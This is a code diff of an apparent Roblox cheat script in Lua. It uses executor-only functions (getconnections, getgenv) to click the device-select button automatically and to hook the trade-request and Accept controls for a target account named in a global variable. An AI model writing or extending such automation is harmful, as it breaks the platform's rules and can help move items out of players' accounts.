@@ -17,13 +17,12 @@ queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_
 print("PlayerGui и Humanoid загружены!")
 
 local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-repeat wait(1) 
+repeat wait(2) 
     print('waiting')
-    local args = {
-        [1] = "Phone";
-    }
-    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("ChangeLastDevice"):FireServer(unpack(args))
+    local selectt = playerGui.DeviceSelect.Container.Tablet.Button
+    getconnections(selectt.MouseButton1Click)[1]:Fire()
 until not player.PlayerGui:FindFirstChild("DeviceSelect")
 
 local targetName = getgenv().name
@@ -42,10 +41,8 @@ local DEVICE_TYPE = get_device_type()
 game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
     lastOfferTime = args.LastOffer
 end)
-local playerGui = player:WaitForChild("PlayerGui")
-local tradeGUI1 = playerGui:WaitForChild("TradeGUI_Phone")
 local tradeGUI2 = playerGui:WaitForChild("TradeGUI")
-local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2 or tradeGUI1
+local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -59,8 +56,7 @@ local acceptcon = actions:WaitForChild("Accept")
 
 -- Получаем TradeRequest GUI
 local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
-local tradeRequest1 = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu:WaitForChild("TradeRequest")
-local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2 or tradeRequest1
+local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
 
 TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeRequest.Visible then
